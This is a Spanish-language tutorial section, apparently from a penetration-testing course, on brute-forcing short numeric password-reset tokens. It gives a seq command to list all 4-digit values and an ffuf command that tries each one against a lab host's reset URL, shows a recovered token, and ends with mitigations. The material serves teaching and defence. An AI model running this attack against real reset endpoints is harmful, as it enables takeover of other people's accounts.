# Fuerza bruta de tokens de restablecimiento de contraseña

## Por qué el mecanismo de "olvidé mi contraseña" es un objetivo tan valioso

La recuperación de contraseña existe para resolver un problema legítimo de experiencia de usuario, pero introduce su propia superficie de ataque: si el **token** que verifica la identidad del solicitante (enviado normalmente por email o SMS) es predecible o tiene un espacio de valores reducido, un atacante puede saltarse por completo la necesidad de conocer la contraseña original — el mecanismo pensado para *recuperar* el acceso se convierte en una vía directa para *tomarlo*.

## Identificando un token débil

El indicador más directo de debilidad es la **longitud y composición** del token. Un token de solo 4 dígitos numéricos tiene únicamente 10.000 valores posibles — un espacio de búsqueda trivialmente pequeño comparado con cualquier estándar razonable de seguridad.

```
http://10.10.10.5/reset_password.php?token=7351
```

Un token de 4 dígitos visible en la URL de restablecimiento es la señal de alarma inmediata: ese espacio de búsqueda es comparable al de un PIN de cajero automático, no al de un mecanismo de seguridad pensado para proteger el acceso completo a una cuenta.

## Construyendo el ataque

```bash
seq -w 0 9999 > tokens.txt
```

`-w` (de `seq`) rellena cada número con ceros a la izquierda hasta igualar la longitud máxima (`0000`, `0001`, ..., `9999`), generando exactamente el formato de token de 4 dígitos esperado.

```bash
ffuf -w tokens.txt \
     -u http://10.10.10.5/reset_password.php?token=FUZZ \
     -fr "The provided token is invalid"
```

`-fr` filtra las respuestas que contienen el mensaje de "token inválido" — lo que queda visible es, precisamente, el token correcto:

```
[Status: 200] FUZZ: 6182
```

Con ese token confirmado, el flujo de restablecimiento se completa normalmente desde ese punto, permitiendo establecer una nueva contraseña para la cuenta afectada — sin haber necesitado conocer en ningún momento la contraseña original.

## Por qué esto requiere, casi siempre, un token activo

A diferencia de la fuerza bruta directa contra un login (donde se prueba contra una contraseña que ya existe de forma permanente), atacar un token de restablecimiento normalmente requiere que exista **una solicitud de restablecimiento activa** en el sistema — ya sea iniciada por el propio atacante contra su objetivo (si conoce su email/usuario, confirmado en la fase de enumeración) o aprovechando una ventana donde otro usuario ya ha iniciado el proceso por sí mismo.

## Por qué la longitud del token es el factor más determinante

Exactamente la misma matemática vista en el bloque de *Login Brute Forcing* aplica aquí: un token de 4 dígitos tiene 10⁴ combinaciones; uno de 6 dígitos, 10⁶ — cien veces más. Un token alfanumérico largo y generado con una fuente de aleatoriedad criptográficamente segura puede tener un espacio de búsqueda tan grande que la fuerza bruta resulte completamente inviable en la práctica, incluso sin ningún otro control adicional.

## Mitigación

- **Tokens largos y verdaderamente aleatorios**, generados con un mecanismo criptográficamente seguro — nunca un contador secuencial ni un número de pocos dígitos.
- **Expiración corta**: un token válido solo durante una ventana breve de tiempo reduce drásticamente la oportunidad de completar un ataque de fuerza bruta antes de que deje de ser utilizable.
- **Límite de intentos** sobre el propio endpoint de verificación del token — bloqueando o invalidando el token tras un número razonable de intentos fallidos, el mismo principio de protección contra fuerza bruta que se desarrolla en detalle en el apartado correspondiente de este bloque.
- **Invalidar el token tras su primer uso**, evitando que pueda reutilizarse incluso si quedó expuesto en algún punto (logs, historial del navegador, cabecera `Referer`).

## Conectando con el siguiente apartado

El mismo principio —espacio de búsqueda reducido en un código de un solo uso— se repite con un mecanismo distinto en el siguiente apartado: códigos de autenticación de dos factores (2FA), que comparten exactamente la misma debilidad estructural cuando se implementan con longitudes cortas y sin las protecciones adecuadas de límite de intentos.
